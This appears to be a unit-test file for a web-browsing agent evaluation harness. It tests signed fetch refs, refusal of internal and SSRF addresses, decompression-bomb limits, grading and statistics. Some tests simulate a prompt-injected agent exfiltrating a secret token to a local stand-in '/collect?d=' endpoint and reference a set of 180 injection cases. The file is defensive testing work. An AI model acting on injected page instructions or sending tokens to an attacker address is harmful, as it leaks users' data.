"""Tests of tools/web_eval (ADR-0003 phase 0): the guarantees the harness and idp-web rely on (T1 an invented address
is never read, T2 refs cannot be forged or reused, T3 inward addresses are refused), its paging, grading and statistics.
Standard library only (CI runs them without the optional extractor)."""
import argparse
import json
import os
import re
import shlex
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from tools.web_eval import e3, e4, e4real, fetch, grade, refs, run, stats
from tools.web_eval.agent import Agent, Model
from tools.web_eval.origin import Origin
from tools.web_eval.providers import Fixture

KEY = b"k" * 32


class Refs(unittest.TestCase):
    def test_a_ref_is_good_for_its_url_and_caller_only(self):
        r = refs.make(KEY, "alice", "https://example.com/a", now=1000)
        self.assertIsNone(refs.check(KEY, "alice", "https://example.com/a", r, now=1001))
        self.assertIn("not made", refs.check(KEY, "alice", "https://example.com/a?d=secret", r, now=1001))
        self.assertIn("not made", refs.check(KEY, "bob", "https://example.com/a", r, now=1001))
        self.assertIn("not made", refs.check(b"x" * 32, "alice", "https://example.com/a", r, now=1001))
        self.assertIn("expired", refs.check(KEY, "alice", "https://example.com/a", r, now=1000 + 3601))
        exp, mac = r.split(".")
        later = f"{int(exp, 16) + 99999:08x}.{mac}"  # moving the expiry breaks the MAC
        self.assertIn("not made", refs.check(KEY, "alice", "https://example.com/a", later, now=1001))
        for bad in ("", "x", "zz.zz", None):
            self.assertIsNotNone(refs.check(KEY, "alice", "https://example.com/a", bad, now=1001))


class Addresses(unittest.TestCase):
    def test_inward_and_odd_addresses_are_refused(self):
        for url in e4.SSRF:
            with self.subTest(url=url), self.assertRaises(fetch.Refused):
                fetch.check_address(url)

    def test_a_public_page_that_redirects_inward_is_refused(self):
        o = Origin({"/inward": ("redirect", "http://127.0.0.2/admin"), "/robots.txt": ("text/plain", b"")})
        try:
            with self.assertRaisesRegex(fetch.Refused, "not a public address"):
                fetch.read(o.base + "/inward", o.allow)
        finally:
            o.close()


class Paging(unittest.TestCase):
    def test_parts_cover_the_text_and_never_cut_a_character(self):
        text = "运单" * 5000 + "end"
        parts, off = [], 0
        while True:
            part, off, total = fetch.page(text, off, limit=1000)
            self.assertLessEqual(len(part.encode()), 1000)
            parts.append(part)
            if off < 0:
                break
        self.assertEqual("".join(parts), text)
        self.assertEqual(total, len(text.encode()))


class Grading(unittest.TestCase):
    def test_rule(self):
        self.assertEqual(grade.rule("The surcharge is USD 1.85.", "USD 1.85"), "CORRECT")
        self.assertEqual(grade.rule("每件 1.85 美元", "1.85 美元"), "CORRECT")
        self.assertEqual(grade.rule("USD 2.10", "USD 1.85", ["$1.85"]), "INCORRECT")
        self.assertEqual(grade.rule("unknown", "USD 1.85"), "NOT_ATTEMPTED")

    def test_cited_sentences(self):
        got = grade.cited_sentences("It opened in May [1]. It cost EUR 86 million [2][3].\nFinal answer: May")
        self.assertEqual(got, [("It opened in May .", [1]), ("It cost EUR 86 million .", [2, 3])])


class Stats(unittest.TestCase):
    def test_interval_and_paired_difference(self):
        m, lo, hi = stats.bootstrap_ci([1, 0, 1, 1, 0, 1, 1, 1, 0, 1], resamples=2000)
        self.assertAlmostEqual(m, 0.7)
        self.assertLess(lo, m)
        self.assertGreater(hi, m)
        a = {i: 1.0 for i in range(40)}
        b = {i: (1.0 if i < 10 else 0.0) for i in range(40)}
        p = stats.paired(a, b, resamples=2000)
        self.assertAlmostEqual(p["diff"], 0.75)
        self.assertLess(p["p"], 0.01)
        same = stats.paired(a, a, resamples=500)
        self.assertEqual(same["diff"], 0)

    def test_kappa(self):
        self.assertEqual(stats.cohen_kappa([("A", "A"), ("B", "B")]), 1.0)
        self.assertLess(stats.cohen_kappa([("A", "B"), ("B", "A")]), 0)


class ScriptedModel(Model):
    """Searches, then reads what `pick` says (the result it was given, or an address of its own), then answers."""

    def __init__(self, pick):
        super().__init__(base="", name="scripted")
        self.pick = pick

    def chat(self, messages, tools=None, seed=None):
        tool_msgs = [m for m in messages if m["role"] == "tool"]
        if not tool_msgs:
            call = {"name": "web_search", "arguments": json.dumps({"query": messages[-1]["content"]})}
        elif len(tool_msgs) == 1:
            url = re.search(r"address: (\S+)", tool_msgs[0]["content"]).group(1)
            ref = re.search(r"ref: (\S+)", tool_msgs[0]["content"]).group(1)
            call = {"name": "web_fetch", "arguments": json.dumps(self.pick(url, ref))}
        else:
            return {"choices": [{"message": {"content": "It is USD 1.85 [1].\nFinal answer: USD 1.85"}}], "usage": {}}
        return {"choices": [{"message": {"content": "", "tool_calls": [{"id": "c1", "function": call}]}}], "usage": {}}


class AgentGuarantees(unittest.TestCase):
    def setUp(self):
        cases, pages, table = e3.cases()
        self.case = next(c for c in cases if c["inducement"] == "url" and c["hiding"] == "visible" and c["lang"] == "en")
        self.origin = Origin({})
        self.origin.pages = {k: (t, b.replace(b"{origin}", self.origin.base.encode())) for k, (t, b) in pages.items()}
        self.origin.pages["/robots.txt"] = ("text/plain", b"")
        self.table = table

    def tearDown(self):
        self.origin.close()

    def _run(self, pick):
        agent = Agent(ScriptedModel(pick), Fixture({"": self.table[self.case["id"]]}, self.origin.base), allow=self.origin.allow,
                      context=self.case["context"])
        return agent.run(self.case["question"]).to_json()

    def test_a_search_result_is_read_with_its_ref(self):
        t = self._run(lambda url, ref: {"url": url, "ref": ref})
        self.assertEqual([f["status"] for f in t["fetches"]], ["ok"])
        self.assertIn("1.85", t["sources"][1]["text"])
        self.assertEqual(t["final"], "USD 1.85")

    def test_an_address_the_model_writes_is_never_read(self):
        steal = self.origin.base + "/collect?d=" + self.case["token"]
        for pick in (lambda url, ref: {"url": steal, "ref": ref},          # someone else's ref
                     lambda url, ref: {"url": steal, "ref": ""},           # none
                     lambda url, ref: {"url": steal, "ref": refs.make(b"g" * 32, "x", steal)}):  # one it made up
            t = self._run(pick)
            self.assertEqual(t["fetches"][0]["status"], "refused")
            self.assertEqual(self.origin.collected(), [])
            out = e3.outcome(self.case, t, self.origin.collected())
            self.assertTrue(out["attempted_url"])
            self.assertFalse(out["executed_url"])

    def test_the_check_is_what_stops_it(self):
        """Without the ref check the same run reaches the attacker: the test above is not vacuous."""
        steal = self.origin.base + "/collect?d=" + self.case["token"]
        with mock.patch.object(refs, "check", return_value=None):
            self._run(lambda url, ref: {"url": steal, "ref": ""})
        self.assertEqual(len(self.origin.collected()), 1)


class BusinessSet(unittest.TestCase):
    def test_every_item_is_anchored_sourced_and_independently_confirmed(self):
        from tools.web_eval import sets
        items = sets.e2()
        self.assertGreaterEqual(len(items), 151)
        self.assertEqual(len({i["id"] for i in items}), len(items))
        for i in items:
            with self.subTest(id=i["id"]):
                self.assertIn(i["lang"], ("zh", "en"))
                self.assertTrue(i["question"].strip() and i["answer"].strip())
                # the answer cannot change later: a date in the question, or a unique version or named enactment it asks about
                self.assertTrue(re.search(r"20\d\d|\d+\.\d+|《", i["question"]), "the question carries its time anchor")
                self.assertTrue(i["sources"] and all(s["url"].startswith("http") and s["quote"] for s in i["sources"]))
                self.assertIn(i["audit"]["status"], ("agreed", "adjudicated"))  # a second, blind look found the same answer
                self.assertTrue(i["audit"]["sources"])


class SecuritySet(unittest.TestCase):
    def test_180_cases_on_60_pages(self):
        cases, pages, table = e3.cases()
        self.assertEqual(len(cases), 180)
        self.assertEqual(len({(c["lang"], c["hiding"], c["framing"]) for c in cases}), 60)
        self.assertEqual(len({c["token"] for c in cases}), 180)
        for c in cases:  # the answer is on the page, and the excerpt does not give it away
            self.assertIn(c["answer"].split()[-1] if c["lang"] == "en" else "1.85", pages[c["path"]][1].decode())
            self.assertNotIn("1.85", table[c["id"]][0]["snippet"])


class Encodings(unittest.TestCase):
    """Servers compress whether or not they are asked (cloud.tencent.com and chinapost.com.cn do, E4 on real pages)."""

    def setUp(self):
        import gzip
        import zlib
        raw = zlib.compressobj(9, zlib.DEFLATED, -15)
        self.origin = Origin({
            "/gz": ("text/html", gzip.compress("<html><body><p>Depot Utrecht reopens.</p></body></html>".encode()), {"Content-Encoding": "gzip"}),
            "/raw-deflate": ("text/plain", raw.compress(b"plain words") + raw.flush(), {"Content-Encoding": "deflate"}),
            "/bomb": ("text/html", gzip.compress(b"0" * (6 << 20)), {"Content-Encoding": "gzip"}),
            "/br": ("text/html", b"\x1b\x03\x00", {"Content-Encoding": "br"}),
        })
        self.addCleanup(self.origin.close)

    def read(self, path):
        return fetch.read(self.origin.base + path, self.origin.allow, robots=False)

    def test_gzip_and_deflate_bodies_are_decoded(self):
        self.assertIn("Depot Utrecht reopens.", self.read("/gz")["text"])
        self.assertEqual(self.read("/raw-deflate")["text"], "plain words")

    def test_the_size_limit_holds_after_decoding_and_unknown_encodings_are_refused(self):
        with self.assertRaisesRegex(fetch.Refused, "larger than"):
            self.read("/bomb")
        with self.assertRaisesRegex(fetch.Refused, "content encoding br"):
            self.read("/br")


class RealPages(unittest.TestCase):
    """E4 on real pages: the scoring the hand annotations are checked with, and the view they are made from."""

    def test_a_passage_counts_whatever_the_markup_and_spacing(self):
        page = {"contain": ["示例物流于 2026 年 11 月 3 日启用新中心", "The hub handles 42,000 parcels an hour"],
                "not_contain": ["Subscribe to our newsletter"]}
        s = e4real.score("**示例物流**于2026年11月3日启用新中心。\n\nThe hub *handles* 42,000 parcels\nan hour.", page)
        self.assertEqual((s["kept"], s["of"], s["leaked"]), (2, 2, 0))
        s = e4real.score("Subscribe to our\nnewsletter", page)
        self.assertEqual((s["kept"], s["leaked"], s["missing"]), (0, 1, page["contain"]))

    def test_the_view_shows_visible_text_with_its_path_and_no_script(self):
        p = e4real._Nodes()
        p.feed("<html><body><nav><a href='/'>Products page</a></nav><script>var x = 'in a script'</script>"
               "<main><p>Main <b>text</b><br>here</p></main><img src='a.png'></body></html>")
        self.assertEqual(p.lines, ["body>nav>a | Products page", "body>main>p | Main", "body>main>p>b | text", "body>main>p | here"])

    def test_the_stdlib_setting_is_the_fallback_alone(self):
        _, text, how = fetch.extract("<html><body><nav>Menu</nav><p>Body text.</p></body></html>", "https://example.com/", "stdlib")
        self.assertEqual((how, text), ("stdlib", "Body text."))


# a tiny external extractor: the text is the page's <p> contents, the status line says which engine "produced" it
SCRIPT = (
    "import re, sys\n"
    "args = sys.argv[1:]\n"
    "page = sys.stdin.read()\n"
    "if 'crash' in args:\n"
    "    sys.exit(3)\n"
    "if 'hang' in args:\n"
    "    import time; time.sleep(30)\n"
    "assert args[-2] == '-url'\n"
    "print('\\n\\n'.join(re.findall(r'<p>(.*?)</p>', page)) + ' [' + args[-1] + ']')\n"
    "print('engine=' + ('plain' if 'plain' in args else 'fake') + ' title=Some  title', file=sys.stderr)\n")


class ExternalExtractors(unittest.TestCase):
    """An external extractor command is scored as one more setting, and can replace the built-in one in E4 (W2)."""

    def setUp(self):
        self.dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.dir.cleanup)
        self.script = Path(self.dir.name) / "fake.py"
        self.script.write_text(SCRIPT)
        self.cmd = f"{shlex.quote(sys.executable)} {shlex.quote(str(self.script))}"

    def test_the_command_gets_the_page_on_stdin_and_the_url_appended(self):
        title, text, how = fetch.external(self.cmd, "<p>Hello</p><p>world</p>", "https://example.com/a")
        self.assertEqual((title, text, how), ("Some  title", "Hello\n\nworld [https://example.com/a]", "fake"))

    def test_a_failing_or_slow_command_is_empty_text_and_says_so(self):
        for arg, why in (("crash", "exit 3"), ("hang", "no answer")):
            with mock.patch.object(fetch, "EXTERNAL_TIMEOUT", 0.5):
                self.assertEqual(fetch.external(f"{self.cmd} {arg}", "<p>x</p>", "https://e.com/")[1], "")
                self.assertIn(why, fetch.external(f"{self.cmd} {arg}", "<p>x</p>", "https://e.com/")[2])
        self.assertTrue(fetch.external("/no/such/command", "x", "https://e.com/")[2].startswith("failed: cannot start"))

    def test_extract_with_a_command_replaces_the_builtin_and_without_one_changes_nothing(self):
        html = "<html><body><nav>Menu</nav><p>Body text.</p></body></html>"
        self.assertEqual(fetch.extract(html, "https://e.com/", "stdlib")[1], "Body text.")
        self.assertEqual(fetch.extract(html, "https://e.com/", "stdlib", command=self.cmd)[1], "Body text. [https://e.com/]")

    def test_the_settings_variable_is_parsed_and_a_bad_one_is_refused(self):
        with mock.patch.dict(os.environ, {"WEB_EVAL_EXTRACTORS": f"a=cmd one; b = cmd two -x ;"}):
            self.assertEqual(fetch.external_settings(), {"a": "cmd one", "b": "cmd two -x"})
        with mock.patch.dict(os.environ, {"WEB_EVAL_EXTRACTORS": ""}):
            self.assertEqual(fetch.external_settings(), {})
        for bad in ("nameonly", "a=x;a=y", "=x"):
            with mock.patch.dict(os.environ, {"WEB_EVAL_EXTRACTORS": bad}), self.assertRaises(SystemExit):
                fetch.external_settings()

    def test_e4_real_reports_each_external_command_next_to_the_builtin_settings(self):
        root = Path(self.dir.name) / "e4"
        (root / "pages").mkdir(parents=True)
        (root / "pages" / "p1.json").write_text(json.dumps({"id": "p1", "url": "https://e.com/p1", "charset": "utf-8"}))
        (root / "pages" / "p1.raw").write_bytes(b"<html><body><nav>Menu words</nav><p>Keep this passage.</p><p>Lose nothing here.</p></body></html>")
        (root / "ann-t.jsonl").write_text(json.dumps({"id": "p1", "url": "https://e.com/p1", "lang": "en", "kind": "news", "script_only": False,
                                                       "contain": ["Keep this passage.", "Lose nothing here."], "not_contain": ["Menu words"]}) + "\n")
        out = Path(self.dir.name) / "out"
        out.mkdir()
        env = {"WEB_EVAL_EXTRACTORS": f"fake={self.cmd}; fake-plain={self.cmd} plain; broken={self.cmd} crash"}
        real_load_all = e4real.load_all  # its default root is bound when it is defined, so the test passes its own
        with mock.patch.object(run.e4real, "ROOT", root), mock.patch.dict(os.environ, env), \
                mock.patch.object(run.e4real, "load_all", lambda prefix="ann-": real_load_all(root, prefix)), \
                mock.patch.object(run, "_extractor", return_value="stdlib (trafilatura not installed)"), mock.patch("builtins.print"):
            self.assertTrue(run.run_e4_real(argparse.Namespace(), out))
        report = (out / "report.md").read_text()
        rows = {l.split("|")[1].strip(): [c.strip() for c in l.split("|")[2:-1]] for l in report.splitlines() if l.startswith("| ") and "|---" not in l}
        # setting: pages, kept %, whole %, leaked %, clean %, fell back, median chars, failed
        self.assertEqual(rows["stdlib"][:5], ["1", "100.0", "100.0", "0.0", "100.0"])
        self.assertEqual(rows["fake"][:5] + [rows["fake"][7]], ["1", "100.0", "100.0", "0.0", "100.0", "0"])
        self.assertEqual(rows["fake-plain"][5], "0")  # the plain reader itself has not "fallen back"
        self.assertEqual((rows["broken"][1], rows["broken"][7]), ("0.0", "1"))
        self.assertIn("Pages where broken lost a passage or kept furniture:", report)
        self.assertIn("failed: exit 3", report)

    def test_the_e4_variable_replaces_the_builtin_extractor_in_reads(self):
        origin = Origin({"/a": ("text/html", b"<html><body><nav>Menu</nav><p>Alpha beta.</p></body></html>")})
        self.addCleanup(origin.close)
        with mock.patch.dict(os.environ, {"WEB_EVAL_EXTRACT_CMD": self.cmd}):
            page = fetch.read(origin.base + "/a", origin.allow, robots=False)
        self.assertEqual((page["text"], page["extractor"]), ("Alpha beta. [" + origin.base + "/a]", "fake"))
        with mock.patch.dict(os.environ, {"WEB_EVAL_EXTRACT_CMD": ""}):
            self.assertNotIn("[", fetch.read(origin.base + "/a", origin.allow, robots=False)["text"])


if __name__ == "__main__":
    unittest.main()
